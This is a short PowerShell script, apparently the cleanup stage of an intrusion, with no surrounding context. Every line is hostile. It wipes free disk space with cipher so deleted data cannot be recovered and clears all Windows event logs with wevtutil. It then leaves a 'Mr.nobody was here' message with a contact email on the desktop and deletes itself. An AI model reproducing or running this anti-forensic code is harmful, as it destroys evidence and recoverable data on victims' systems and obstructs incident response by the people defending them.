cipher /w:c:\
wevtutil el | Foreach-Object {wevtutil cl "$_"}
Set-Content -Path "C:\Users\$env:USERNAME\Desktop\README.md" -Value "Mr.nobody was here, talk to me at Mr.nobodyAl22SU@proton.me"
Remove-Item -Path $MyInvocation.MyCommand.Source -Force
